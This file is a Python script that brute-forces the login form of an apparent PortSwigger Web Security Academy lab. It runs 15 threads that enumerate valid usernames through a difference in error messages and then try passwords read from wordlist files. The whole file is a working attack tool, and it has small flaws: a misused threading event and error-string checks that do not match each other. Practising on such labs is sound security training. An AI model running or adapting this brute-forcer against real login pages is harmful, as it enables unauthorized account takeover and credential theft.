import time

import requests
from queue import Queue
import threading

server_name = "0aa60094046932a080a0f38200320080"

url = f"https://{server_name}.web-security-academy.net/login"
headers = {
    "Host": f"{server_name}.web-security-academy.net",
   # "Cookie": "session=4HEsDrimwiP1TPhLv08VcO6Yiu3Q2xmk",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

found_username, found_password = '', ''
username_queue = Queue()
password_list = []
found = threading.Event()

def bruteForce():
    while not username_queue.empty():
        username = username_queue.get()
        data = f"username={username}&password=123"
        print(f"[-] Searching valid username: {username}")
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        text = response.text
        if "Invalid username or password." not in text:
            found.is_set()
            time.sleep(2)
            print(f"[!] Username found: {username}\n")
            for password in password_list:
                print(f"[-] Testing password: {password}")
                data = f"username={username}&password={password}"
                response = requests.post(url, headers=headers, data=data, allow_redirects=False)
                text = response.text
                if "Invalid username or password " not in text:
                    print(f"[!] Found: {username}:{password}")
                    exit(0)

def main1():
    # Put the usernames in a Queue
    with open('../../credentials/usernames', 'r') as file:
        for line in file:
            username_queue.put(line.strip('\n'))

    # Put the passwords in a Queue
    with open('../../credentials/passwords', 'r') as file:
        for line in file:
            password_list.append(line.strip('\n'))

    num_of_threads = 15
    threads = []
    for _ in range(num_of_threads):
        t = threading.Thread(target=bruteForce)
        t.start()
        threads.append(t)




if __name__ == '__main__':
    main1()
